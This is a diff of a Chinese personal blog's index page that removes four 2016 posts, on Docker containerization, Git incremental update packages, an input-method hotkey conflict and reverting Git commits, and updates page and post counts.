-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="逐流小站">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2016/2016-08-13-docker-and-containerization/" itemprop="url">Docker 与容器化技术实践</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-08-12T16:00:00+00:00">
-                2016-08-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
-     crossorigin="anonymous"></script>
-<ins class="adsbygoogle"
-     style="display:block; text-align:center;"
-     data-ad-layout="in-article"
-     data-ad-format="fluid"
-     data-ad-client="ca-pub-4522670236044605"
-     data-ad-slot="5167312561"></ins>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-      
-      
-
-      
-        
-        
-          
-            <blockquote>
-<p>这篇文章由我 7 月末在 <a target="_blank" rel="noopener" href="http://connextconf.org/">Connext 2016</a> 进行的一次技术分享整理而来。</p>
-</blockquote>
-<h3 id="RP-主机"><a href="#RP-主机" class="headerlink" title="RP 主机"></a>RP 主机</h3><p>我在高一的时候开始尝试搭建自己的网站，当时市面上的「虚拟主机」基本上只提供 PHP 环境，限制也比较多。于是我在 Linode 以每月 20 美元的价格买了一台 Linux VPS 用来搭建网站，但当时我的零花钱无法负担这个开销，于是尝试性地公开出售服务器资源，为此我编写了一套叫 <a target="_blank" rel="noopener" href="https://github.com/HackPlan/RootPanel">RootPanel</a> 的虚拟主机管理系统。</p>
-<p>和其他虚拟主机不同的是，RP 主机的用户可以有非常大的权限 —— 可以登录 SSH, 运行 Node.js、Python 之类的程序；而 RootPanel 则通过 Web 的界面允许用户使用 MySQL、MongoDB 数据库，并且通过 Nginx 共享 80 端口，RootPanel 会检查用户的请求是否符合权限要求，然后去与 Nginx 这些系统服务交互。</p>
-<p>当时 Docker 还没有出现，我用了一些比较「传统」的方式来隔离 RP 主机上用户的权限：</p>
-<ul>
-<li>文件系统：Unix users（文件权限）、quota-tools（磁盘空间）</li>
-<li>CPU 和内存：自行编写脚本来调整进程优先级（CPU 超限时）和杀进程（内存超限时）</li>
-<li>进程和网络：因为 Unix 本身的权限，无权向其他进程发送信号</li>
-</ul>
-<p>在运行 Web 服务时，后端程序（例如 PHP-FPM、Python 的 uwsgi、Node.js 应用进程）本身由用户运行，以 Unix Socket 的方式提供服务（Unix Socket 会遵守 Unix 的文件权限机制），然后可以在 RootPanel 的 Web 界面上配置从域名到 Unix Socket 的映射（RootPanel 会检查你配置的 Unix Socket 是否在你的 home 目录中等），由 Nginx 完成反向代理，实现共享 80 端口。</p>
-<p>Redis 和 Memache 这种轻量级数据库也是由用户自行运行的，通过 Unix Socket 提供服务来避免被其他用户访问到。出于性能考虑，所有用户会共同使用同一个 MySQL 和 MongoDB，用户可以在 RootPanel 的 Web 上创建和管理数据库，RootPanel 会为每个用户分配一个用户名和密码，使用这些数据库本身的用户机制进行权限控制。</p>
-<p>当然 RP 主机现在已经被关掉了，详见 <a href="/2015/10/rpvhost-shutdown-plan/">RP 主机和 GreenShadow 关闭计划</a>。</p>
-<h3 id="「隔离」和「资源控制」"><a href="#「隔离」和「资源控制」" class="headerlink" title="「隔离」和「资源控制」"></a>「隔离」和「资源控制」</h3><p>到后来 2014 年初的时候我发现了 Docker, 它是一个基于 Linux 的轻量级虚拟化技术，可以以非常低的成本来创建与主机隔离的、可以独立进行资源控制的「容器」。</p>
-<p>在前面 RP 主机的例子中，我们虽然一定程度地解决了这两个问题，但并不完美。隔离方面 RP 主机只做到了权限的隔离，但用户依然可以看到其他用户和它们的进程、网络链接；资源控制方面，CPU 和内存都依赖于脚本进行控制，控制的粒度和准确性显然不如利用内核本身的特性。</p>
-<p>Docker 使用 Linux 2.6 提供的 namespaces 特性来隔离容器之间的文件系统（mount namespace）、主机名（UTS namespace）、进程（PID &amp; IPC namespace）、网络（network namespace）、用户（user namespace）。使容器中的进程只能看到与自己有关的系统资源，完全感觉不到主机上其他的容器的存在。</p>
-<p>Docker 还使用了 Linux 2.6 提供的 cgroups 特性来统计和限制容器的系统资源，包括 CPU（cpuset &amp; cpu &amp; cpuacct cgroup）、内存（memory cgroup）、磁盘 IO（blkio cgroup）等。在资源控制方面，因为是由内核执行的，因此可以进行非常细粒度的控制，例如在 CPU 上，既可以为容器设置权重，也可以直接设置最大使用率。</p>
-<h3 id="联合文件系统"><a href="#联合文件系统" class="headerlink" title="联合文件系统"></a>联合文件系统</h3><p>在解决了隔离和资源控制之后，我们可以允许容器自由地修改容器内的文件系统，每个容器可以使用不同的发行版、运行不同版本的系统服务。但为了允许容器去自定义它们的文件系统，我们必须要为每个容器挂载一个单独的根目录，这样将会占用大量的磁盘空间。</p>
-<p>为了解决这个问题，Docker  基于「联合文件系统（AUFS、OverlayFS）」实现了一个「镜像」的功能。联合文件系统是一种可以将不同的目录，以分层「叠加」的方式挂载为一个文件系统的文件系统。Docker 会将不同容器间共同的部分作为一个共用的只读层（例如发行版就是一个层），然后为每个容器再叠加一个可写的层，容器对文件系统的修改会写入到这个可写的层，而不是共享的层，在容器运行结束后，这个可写的层也可以固化为一个只读的层，被其他容器复用（这就是 docker build 的过程）。</p>
-<h3 id="将应用封装为镜像"><a href="#将应用封装为镜像" class="headerlink" title="将应用封装为镜像"></a>将应用封装为镜像</h3><p>Docker 的容器实际上都是从 Docker 镜像创建出来的，可以说镜像是容器的模板，这个概念类似于进程是由可执行文件创建出来的，但镜像不仅仅包含可执行文件，而是包含了一个程序允许所需要的所有环境。</p>
-<p>我们可以通过 Dockerfile 来创建镜像，Dockerfile 中包含了若干指令，这些指令会在容器中被执行，而这些指令对文件系统的修改，会作为构建出的镜像中的一个「层」。</p>
-<p>Docker 镜像让应用的「交付」变得简单了，在理想的情况下，Dockerfile 中包含了构建应用所需要的运行环境的指令，而镜像则是一次构建的结果，Docker 为镜像提供了二进制级别的兼容性，镜像可以被传输到其他 Linux 主机上直接运行，交付一个应用就像发送一个可执行文件那么简单。基于我们前面提到的联合文件系统，Docker 镜像在传输时只会传输新的层，如果不同的镜像基于同一个基础的镜像（层）来构建，那么并不会产生额外的传输和存储开销。</p>
-<h3 id="无状态的容器"><a href="#无状态的容器" class="headerlink" title="无状态的容器"></a>无状态的容器</h3><p>在一个服务器端系统中，包含了大量业务逻辑、需要频繁修改的「应用进程」是最不稳定的部分，它可能会出错、会崩溃重启、会占用大量的计算资源，因此我们必须要能够快速地对包含应用的容器进行调整。为了做到这一点，一个得到了广泛认同的实践就是将应用实现为「无状态」的，即不在内存中持久性地保存数据，而是将这些状态存储到专门的数据库（Redis 等）中，这些数据库会有自己的分布式解决方案，而不必我们操心。</p>
-<p>这样我们便可以随时停止和启动一个应用容器，而不必担心数据丢失或状态不同步，同时无状态的应用对容器数量也毫不关心，我们可以根据业务的负载情况随时调整容器数量进而增加业务的负载能力，应用也不关心这些进程运行在哪台服务器上（Docker 的镜像为容器提供了一致的运行环境），只要前端的负载均衡（Nginx）可以发现它即可，因此我们还需要一种「服务发现」的机制让负载均衡服务能够感知到新容器的加入和已有容器的退出。</p>
-<h3 id="分布式的容器调度"><a href="#分布式的容器调度" class="headerlink" title="分布式的容器调度"></a>分布式的容器调度</h3><p>在一个公有云的场景中，我们往往需要管理运行在几十台服务器上的几千个容器，物理设备总是可能出现故障的，随着集群规模的增长，出现故障的频率将会越来越高，我们必须能够自动地发现和恢复这些故障，我们将这种程序称为「集群管理器」，它需要关注的问题包括：</p>
-<ul>
-<li>容器崩溃：应用进程因错误或内存超限退出，可以简单通过设置 Docker 的重启策略来解决。</li>
-<li>容器僵死：负载均衡器应该能够将应用容器无响应的情况通知给集群管理器来重启容器。</li>
-<li>服务器崩溃或失联：集群管理需要将崩溃的服务器上的容器移动到其他的服务器并从负载均衡中移除。</li>
-</ul>
-<p>在一些计划中的维护任务也需要保证服务不中断：</p>
-<ul>
-<li>部署新版本：应逐个启动新版本的容器并加入负载均衡，确认新容器工作正常后再将旧容器从负载均衡中移除并停止。</li>
-<li>调度到资源充足的服务器：集群管理器应该能够感知到各个服务器的负载情况，将负载较高的服务器的容器移动到负载较低的服务器。</li>
-</ul>
-<p>集群管理器需要决定将容器部署到哪台服务器，需要考虑的因素包括：</p>
-<ul>
-<li>服务器实际负载。</li>
-<li>有时容器会声明自己需要多少资源，虽然实际并没有占用这么多，但一段时间之后可能会有变化。</li>
-<li>将容器分散到不同的服务器以应对单个服务器失效。</li>
-</ul>
-<p>集群管理器还应该能够应对自身或所依赖的服务失效的情况，通过反复地重试保证实际运行的容器与计划中的一致。</p>
-<p>在集群管理器方面社区已经有了很多成熟的解决方案，例如 Docker Swarm、Kubernetes、Marathon，作为私有云来说都基本够用，但在公有云的场景下经常还是需要自己开发一部分功能来和现有系统（例如计费）整合的。</p>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>因为随着需要处理的数据量越来越大，我们必须将系统设计成分布式的，这需要我们将计算资源进行一个抽象，不去考虑有关运行环境的细节问题，所以虚拟化是一个大的趋势。基于 Docker 的容器是虚拟化解决方案中的一种，也是目前受到了非常多关注的一种，这大概是因为内核级别的虚拟化有着非常好的性能，同时 Docker 作为一个开源的产品也有着非常活跃的社区。我今天主要介绍的是我在部署环节对 Docker 的实践，但 Docker 的应用并不止于此，在开发和测试环节同样有 Docker 的身影。</p>
-<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
-<li><a target="_blank" rel="noopener" href="http://rpvhost.net/">http://rpvhost.net/</a></li>
-<li><a target="_blank" rel="noopener" href="https://jysperm.me/2013/05/810/">https://jysperm.me/2013/05/810/</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/ekenberg/quotatool">https://github.com/ekenberg/quotatool</a></li>
-<li><a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/users_and_groups">https://wiki.archlinux.org/index.php/users_and_groups</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.linux.com/learn/understanding-linux-file-permissions">https://www.linux.com/learn/understanding-linux-file-permissions</a></li>
-<li><a target="_blank" rel="noopener" href="http://www.infoq.com/cn/articles/features-and-design-concept-of-distributed-system">http://www.infoq.com/cn/articles/features-and-design-concept-of-distributed-system</a></li>
-<li><a target="_blank" rel="noopener" href="http://dockone.io/article/1138">http://dockone.io/article/1138</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/generate-incremental-update-package-with-git/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="逐流小站">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2016/generate-incremental-update-package-with-git/" itemprop="url">使用 Git 生成增量更新包</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-08-11T14:18:00+00:00">
-                2016-08-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
-                    <span itemprop="name">技术</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
-     crossorigin="anonymous"></script>
-<ins class="adsbygoogle"
-     style="display:block; text-align:center;"
-     data-ad-layout="in-article"
-     data-ad-format="fluid"
-     data-ad-client="ca-pub-4522670236044605"
-     data-ad-slot="5167312561"></ins>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-      
-      
-
-      
-        
-        
-          
-            <p>上次有人叫我在 Blessing Skin 每次升级的时候带上一个增量更新包，只包含所有上一个版本后修改过的文件。</p>
-<p>我听到这个需求，最开始想到的是使用 <code>git diff --name-only</code>，加上这个参数后可以只显示 commit 之间修改过的文件名，然后就可以用管道通给 zip 之类的程序来压缩。</p>
-<p>去网上搜了搜，发现还有<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lhb25/p/10-useful-advanced-git-commands.html">更简单的方法</a>：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git archive -o ../latest.zip NEW_COMMIT_ID $(git diff --name-only OLD_COMMIT_ID NEW_COMMIT_ID)</span></span><br></pre></td></tr></table></figure>
-
-<p>这是用了 <code>git archieve</code> 命令，本质上和我上面说的也差不离。</p>
-<p>如果你打了 tag，就可以写成这样：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git archive -o ../latest.zip HEAD $(git diff --name-only v3.0.1 HEAD)</span></span><br></pre></td></tr></table></figure>
-
-<p>是不是很方便呢 |∀&#96; )</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/start-to-use-sougou-pinyin/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="逐流小站">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2016/start-to-use-sougou-pinyin/" itemprop="url">开始使用搜狗拼音输入法</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-08-06T13:36:32+00:00">
-                2016-08-06
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%97%A5%E5%B8%B8/" itemprop="url" rel="index">
-                    <span itemprop="name">日常</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
-     crossorigin="anonymous"></script>
-<ins class="adsbygoogle"
-     style="display:block; text-align:center;"
-     data-ad-layout="in-article"
-     data-ad-format="fluid"
-     data-ad-client="ca-pub-4522670236044605"
-     data-ad-slot="5167312561"></ins>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-      
-      
-
-      
-        
-          <p>说起输入法，自从几年前我升级 win8 之后我就对自带的巨硬输入法一见钟情，从此再也没有换过其他输入法。</p>
-<p>然而，前几天被升级 win10 14393 之后（之前是万年 TH2），虽然开始菜单呀，设置页面之类的地方变了许多，但总体来讲对日常使用并没有影响，因此我也就没有特别在意。</p>
-<p>今天我在 Sublime Text 3 中打算进行全局替换的时候，按了快捷键 <code>Ctrl + Shift + F</code>，然而什么反应都没有。在排除了其他可能性<del>（键盘坏了或者我瞎了）</del>之后，就几乎可以确定是热键冲突了。然而排查了运行中的所有软件后，没有一个软件占用了这个快捷键，这就非常的迷了 (*´д&#96;)</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2016/start-to-use-sougou-pinyin/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016-08-06-revert-to-target-commit-with-git/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="逐流小站">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2016-08-06-revert-to-target-commit-with-git/" itemprop="url">如何用 Git 将代码恢复到一个历史的版本</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-08-06T09:39:43+00:00">
-                2016-08-06
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
-     crossorigin="anonymous"></script>
-<ins class="adsbygoogle"
-     style="display:block; text-align:center;"
-     data-ad-layout="in-article"
-     data-ad-format="fluid"
-     data-ad-client="ca-pub-4522670236044605"
-     data-ad-slot="5167312561"></ins>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-      
-      
-
-      
-        
-        
-          
-            <h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>有些时候，在一些特殊情况下，我们需要将代码恢复到一个历史的提交版本上。而这个历史提交版本，离最新的提交已经比较久远了。</p>
-<p>比如，我希望将如下的仓库的提交，恢复到上上上上次提交。当然，我可以一次一次的 revert，但是有没有更快更简单的办法呢？</p>
-<img src="/images/git-revert-1.jpg" class="">
-
-
-<h2 id="暴力的方式"><a href="#暴力的方式" class="headerlink" title="暴力的方式"></a>暴力的方式</h2><p>如果你的仓库是自己在用（不影响别人），那么你可以使用 <code>git reset --hard &lt;target_commit_id&gt;</code> 来恢复到指定的提交，再用 <code>git push -f</code> 来强制更新远程的分支指针。为了保证万一需要找回历史提交，我们可以先打一个 tag 来备份。</p>
-<p>对于刚刚的例子，需要执行的命令就是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 备份当前的分支到 backup_commit</span><br><span class="line">git tag backup_commit</span><br><span class="line">git push origin backup_commit</span><br><span class="line">// 重置 source 分支</span><br><span class="line">git reset --hard 23801b2</span><br><span class="line">// 强制 push 更新远程分支</span><br><span class="line">git push origin source -f</span><br></pre></td></tr></table></figure>
-
-<h2 id="温和的方式"><a href="#温和的方式" class="headerlink" title="温和的方式"></a>温和的方式</h2><p>如果你的仓库是多人在协作，那么你这么操作会使用别人本地的代码库混乱，所以只能建一个新的提交，这个新的提交中把想取消的提交都 revert 掉，那么具体应该如何做呢？方法如下：</p>
-<p>首先，和刚刚一样，用 <code>git reset --hard 23801b2</code> 将代码切换到目标提交的 id。接下来，用 <code>git reset --soft origin/source</code> 命令，将当前代码切换回最新的提交。</p>
-<p>执行完上面两步后，你的仓库还是最新的提交，但是工作区变成了历史的提交内容，这个时候用 <code>git add</code> 和 <code>git commit</code> 即可。最终完成的效果如下：</p>
-<img src="/images/git-revert-2.jpg" class="">
-
-<p>不过经过念茜的提醒，该方法需要保证 reset 的时候没有别人做新的提交，如果有的话，会一并把别人的提交也撤销了。所以还是挺危险的，慎用。</p>
-<p>虽然用到的时候很少，但是理解它的原理有助于大家理解 Git 的工作区，暂存区和版本库的各种指针操作的意义，希望对大家有用。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/48/">&lt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/48/">48</a><span class="page-number current">49</span><a class="page-number" href="/page/50/">50</a><span class="space">&hellip;</span><a class="page-number" href="/page/73/">73</a><a class="extend next" rel="next" href="/page/50/">&gt;</a>
+    <a class="extend prev" rel="prev" href="/page/48/">&lt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/48/">48</a><span class="page-number current">49</span><a class="page-number" href="/page/50/">50</a><span class="space">&hellip;</span><a class="page-number" href="/page/74/">74</a><a class="extend next" rel="next" href="/page/50/">&gt;</a>
   </nav>
 
 
@@ -3702,7 +3786,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">1460</span>
+                  <span class="site-state-item-count">1464</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -3724,7 +3808,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">895</span>
+                  <span class="site-state-item-count">910</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
